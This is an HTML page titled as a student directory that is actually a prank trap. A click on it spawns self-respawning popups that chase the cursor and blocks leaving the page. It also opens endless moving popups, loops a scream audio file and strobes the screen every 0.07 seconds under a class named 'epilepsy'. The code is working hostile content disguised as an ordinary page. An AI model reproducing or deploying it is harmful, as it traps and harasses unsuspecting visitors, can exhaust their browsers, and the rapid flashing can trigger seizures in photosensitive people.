<html>
    <head>
        <title>2024-2025 Student Directory</title>
        <style>
            body {
                background: url("./temp.png");
                background-repeat: no-repeat;
            }
            .epilepsy{
              text-align: center;
              font-size: 4em;
              margin-top: calc(50vh - .575em);
              animation: epilepsy .07s infinite;
              font-family:'arial';
            }
            @keyframes epilepsy{
              0%{color:black;background:red;}
              50%{color:black;background:blue;}
              51%{color:white;background:yellow;}
              100%{color:white;background:green;}
            }
            
            
        </style>
    </head>
    <body>

        <script>
            
            (function(){var erudaScript=document.createElement('script');erudaScript.src="https://cdn.jsdelivr.net/npm/eruda/eruda.min.js";var erudaTimingScript=document.createElement('script');erudaTimingScript.src="https://cdn.jsdelivr.net/npm/eruda-timing/eruda-timing.min.js";var erudaCodeScript=document.createElement('script');erudaCodeScript.src="https://cdn.jsdelivr.net/npm/eruda-code/eruda-code.min.js";var erudaDomScript=document.createElement('script');erudaDomScript.src="https://cdn.jsdelivr.net/npm/eruda-dom/eruda-dom.min.js";document.body.appendChild(erudaScript);erudaScript.onload=function(){eruda.init();document.body.appendChild(erudaTimingScript);erudaTimingScript.onload=function(){eruda.add(erudaTiming)};document.body.appendChild(erudaCodeScript);erudaCodeScript.onload=function(){eruda.add(erudaCode)};document.body.appendChild(erudaDomScript);erudaDomScript.onload=function(){eruda.add(erudaDom)};}})();
            
            // window.addEventListener("message", function(event) {
            //     console.log(event.data.msg, event.data.url);
            // });

            function rickroll() {
              var win = window.open('', "", 
                                "left=" + 0 + ",top=" + 0 +
                                ",width=" + 300 + ",height=" + 300 +
                                ",status=yes");
    
              win.document.write(`<img src="https://media.tenor.com/x8v1oNUOmg4AAAAM/rickroll-roll.gif" width="300" height="300"><script>
                var x = 0;
                var y = 0;
                var dx = 12;
                var dy = 15;
                var w = 300;
                var h = 300;
    
                window.setInterval(function() {
                
                  if ((x + dx > (screen.availWidth - w)) || (x + dx < 0)) dx = -dx;
    
                // Bounce if we have reached the bottom or top edge
                  if ((y + dy > (screen.availHeight - h)) || (y + dy < 0)) dy = -dy;
    
                  x += dx;
                  y += dy;
    
                window.moveTo(x, y);
    
                }, 20);
              
                </scr`+`ipt>`);
              win.document.body.style.margin="0";
            }

            function download(url) {
                fetch(url, {
                  method: 'GET',
                }).then(function(resp) {
                  return resp.blob();
                }).then(function(blob) {
                  const newBlob = new Blob([blob], { type: "image/jpeg", charset: "UTF-8" })
            
                  // IE doesn't allow using a blob object directly as link href
                  // instead it is necessary to use msSaveOrOpenBlob
                  if (window.navigator && window.navigator.msSaveOrOpenBlob) {
                    window.navigator.msSaveOrOpenBlob(newBlob);
                    return;
                  }
                  const data = window.URL.createObjectURL(newBlob);
                  const link = document.createElement('a');
                  link.dataType = "json";
                  link.href = data;
                  link.download = "file___________________.jpg";
                  link.dispatchEvent(new MouseEvent('click'));
                  setTimeout(function () {
                    // For Firefox it is necessary to delay revoking the ObjectURL
                    window.URL.revokeObjectURL(data), 60
                  });
                });
            }

            //download("https://picsum.photos/200");
            
            function leavingPage(event) {
                event.stopPropagation();
                event.preventDefault();
                return false;
            }
            window.addEventListener("beforeunload", leavingPage);
            function createblockingwindow() {
                var blockingWin = window.open('', '', 'width=300, height=300');
                //console.log(blockingWin);
                blockingWin.document.write(`<img width="300" height="300" src="https://m.media-amazon.com/images/I/61gDDm3btfL.jpg"><script>window.addEventListener("beforeunload", function(event) {event.stopPropagation();event.preventDefault();return false;});</scr`+`ipt>`)
                blockingWin.document.body.style.margin="0";


                //TEMP window.onmousemove=function(e){window.opener.changeXY(e.x, e.y)}; window.onmouseout=function(e) {window.opener.changeXY(-1,-1);}

                
                var loop = window.setInterval(function(){
                    if (blockingWin.closed) {
                        window.clearInterval(loop);
                        // Temp removed:
                        createblockingwindow();
                    }
                }, 10)
                blockingWindows.push(blockingWin);
            }
            function flys() {
                window.setInterval(function(){
                var a = window.open('', '', 'width=200, height=200');
                a.document.write(`<img src="https://www.adamspetcare.com/-/media/Project/OneWeb/Adams/Images/Photos/Blog/Article/flies.jpg" width="200"><script>window.setInterval(function(){window.moveTo(Math.random()*${window.innerWidth}, Math.random()*${window.innerHeight});}, 100);</scr`+`ipt>`);
                }, 500);
            }

            var lastPos = {x:0, y:0};

            var changeXY = {x:0, y:0}

            window.changeXY = function(x, y) {
                // if (x===-1) {
                //     changeXY = {x: 0, y: 0}
                // }
                // console.log(x-150,y-150);  
                // changeXY.x = x-150;
                // changeXY.y = y-150;
            };

            window.onmousemove=function(e) {
                lastPos.x = e.x;
                lastPos.y = e.y;
            }

            var blockingWindows = [];
            
            document.body.onclick=function(){
                for (var i = 0; i<5; i++) {
                    createblockingwindow();
                }
                var song = new Audio('./scream.mp3');
                song.loop = true;
                song.play();
                rickroll();
                document.body.className="epilepsy";

                flys();

                window.setInterval(function(){
                    for (i of blockingWindows) {
                        //console.log(i);
                        i.moveTo(lastPos.x-150, lastPos.y-150);
                    }
                },1);

                
            }
                
        </script>
    </body>
</html>
